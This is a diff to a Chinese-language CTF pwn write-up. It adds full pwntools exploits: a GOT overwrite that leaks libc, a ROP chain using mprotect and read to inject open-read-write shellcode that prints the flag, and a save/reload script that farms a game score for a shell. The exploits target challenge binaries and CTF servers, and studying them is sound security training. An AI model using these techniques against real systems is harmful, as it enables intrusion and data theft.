@@ -676,10 +676,114 @@ p.interactive()
 看了`wp`后知道可以把`close`的`got`表改为`write`的从而泄露栈上数据来获取`libcbase`，由于开启了`sandbox`限制了一些`system`的使用，后面采用`orw`的方法来将`flag`泄露出来。
 过程：
 在第一次输入时输入`close`的`got`表，第二次输入单字节时刚好将其修改为`write`的`plt`，之后执行`close`时可以将栈上数据泄露出来：
+```python
+ret = 0x40101a
+close_got = elf.got['close']
+write_plt = elf.plt['write']
+main_sym = elf.symbols['main']
+
+p.sendafter(b'number :', p64(close_got))
+p.sendafter(b'byte :', b'\xc0')
+
+payload = b'a' * 0x18 + p64(ret) + p64(main_sym)
+
+p.send(payload)
+
+p.recvuntil(b'a' * 0x18)
+p.recv(0xb8 - 0x18)
+real_main = u64(p.recv(6) + b'\x00\x00') - 139
+base = real_main - libc.symbols['__libc_start_main']
+log.success('real_main: ' + hex(real_main))
+log.success('base: ' + hex(base))
+```
 ![[Pasted image 20241031163320.png]]
 可以看到泄露了很多，在gdb中查看找到有用的部分
 ![[Pasted image 20241031163333.png]]
-计算偏移可以算出`__libc_start_main`的真实地址，根据给出的`libc`文件可以算出`libcbase`，
+计算偏移可以算出`__libc_start_main`的真实地址，根据给出的`libc`文件可以算出`libcbase`。
+有了`libcbase`可以利用偏移计算出我们需要的函数和`gadget`的地址从而加以使用。要使用`shellcode`型的`orw`我们首先需要一段有权限的位置，可以用`mprotect`函数，要构造这个函数需要三个参数，分别存在`rdi,rsi,rdx`中，`wp`中说当前版本`libc`不容易控制`rdx`，故用`xchg eax, edx`来设置`rdx`，设置完有权限的位置后还需要用read来将shellcode读入相应位置。然后编写`orw`的`shellcode`将`flag`的值泄露。
+完整exp:
+```python
+from pwn import *
+import pwnlib.gdb
+import pwnlib.shellcraft
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+if local:
+    p = process('./onelast')
+    pwnlib.gdb.attach(p, 'b *0x4013c3')
+else:
+    p = remote('39.106.48.123', 27653)
+
+elf = ELF('./onelast')
+libc = ELF('./libc.so.6')
+
+ret = 0x40101a
+close_got = elf.got['close']
+write_plt = elf.plt['write']
+main_sym = elf.symbols['main']
+
+p.sendafter(b'number :', p64(close_got))
+p.sendafter(b'byte :', b'\xc0')
+
+payload = b'a' * 0x18 + p64(ret) + p64(main_sym)
+
+p.send(payload)
+
+p.recvuntil(b'a' * 0x18)
+p.recv(0xb8 - 0x18)
+real_main = u64(p.recv(6) + b'\x00\x00') - 139
+base = real_main - libc.symbols['__libc_start_main']
+log.success('real_main: ' + hex(real_main))
+log.success('base: ' + hex(base))
+# pause()
+
+p.sendafter(b'number :', p64(0x404000 + 0x800))
+p.sendafter(b'byte :', b'\x70')
+
+pop_rdi = base + libc.search(asm('pop rdi; ret')).__next__()
+pop_rsi = base + libc.search(asm('pop rsi; ret')).__next__()
+pop_rax = base + libc.search(asm('pop rax; ret')).__next__()
+pop_rdx = base + libc.search(asm('pop rdx; ret')).__next__()
+xchg_edx_eax = base + 0x01a7f27 # libc.search不知道为什么search不到，这里直接用的wp中的值
+
+open_ = base + libc.symbols['open']
+read_ = base + libc.symbols['read']
+mprotect = base + libc.symbols['mprotect']
+
+log.success('pop_rdi: ' + hex(pop_rdi))
+log.success('pop_rsi: ' + hex(pop_rsi))
+log.success('pop_rax: ' + hex(pop_rax))
+log.success('xchg_edx_eax: ' + hex(xchg_edx_eax))
+log.success('pop_rdx: ' + hex(pop_rdx))
+log.success('open: ' + hex(open_))
+log.success('read: ' + hex(read_))
+log.success('mprotect: ' + hex(mprotect))
+
+# pause()
+
+payload = b'a' * 0x18
+payload += p64(pop_rdi) + p64(base + 0x1000)
+payload += p64(pop_rsi) + p64(0x1000)
+payload += p64(pop_rax) + p64(7) + p64(xchg_edx_eax)
+payload += p64(mprotect)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi) + p64(base + 0x1000)
+payload += p64(pop_rax) + p64(0x1000) + p64(xchg_edx_eax)
+payload += p64(read_)
+payload += p64(base + 0x1000) # 这里最后还不清楚为什么要加起始位置
+
+p.send(payload)
+
+shellcode = shellcraft.open('./flag', 0, 0)
+shellcode += shellcraft.read('rax', base + 0x1800, 0x100)
+shellcode += shellcraft.write(2, base + 0x1800, 'rax')
+
+p.send(asm(shellcode))
+
+p.interactive()
+```
+![[Pasted image 20241031164815.png]]
 # Week 4
 ## PWN
 ### Maze_Rust
@@ -789,6 +893,47 @@ p.interactive()
 ### MakeHero(复现)
 ### reread(复现)
 ### Sign in(复现)
+看完wp有点绷不住，对战系统，赢了加分，输了扣分，敌方随机，总分达到1145以上就可以获取shell，解题方法：赢了存档，输了读档。~~游戏还是玩少了，这没想到~~
+exp:
+```python
+from pwn import *
+import pwnlib.gdb
+
+context.log_level = 'debug'
+local = True
+if local:
+    p = process('./Signin')
+    # pwnlib.gdb.attach(p, 'b main')
+else:
+    p = remote('ctf.yuawn.id', 8009)
+p.recvuntil('name: ')
+p.sendline(b'lh')
+p.sendline(b'6')
+p.sendline()
+# Berserker
+score = 0
+while score <= 1145:
+    log.success('score: %d' % score)
+    is_win = False
+    p.sendline(b'1')
+    p.sendlineafter(b'class:', 'Berserker')
+    p.recvline()
+    re = p.recv()
+    if b'You beated' in re:
+        score += 5
+        is_win = True
+    p.sendline()
+    p.sendline()
+    if score > 1145:
+        p.interactive()
+        break
+    if is_win:
+        p.sendline(b'6')
+        p.sendline()
+    else:
+        p.sendline(b'5')
+        p.sendline()
+```
 # Week 5
 ## PWN
 ### C_or_CPP(复现)
